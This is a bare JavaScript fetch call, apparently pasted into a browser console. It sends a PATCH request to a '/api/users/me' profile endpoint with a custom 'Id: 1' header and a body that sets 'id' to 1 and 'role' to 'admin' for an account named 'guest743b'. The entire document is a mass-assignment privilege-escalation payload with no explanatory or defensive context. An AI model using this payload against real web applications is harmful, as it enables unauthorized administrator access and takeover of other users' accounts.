fetch('/api/users/me', {
  method: 'PATCH',
  headers: {'Content-Type': 'application/json', 'Id':1},
  body: JSON.stringify({
  "bio": "1",
  "display_name": "guest743b",
  "id": 1,
  "role" : "admin"
})
});
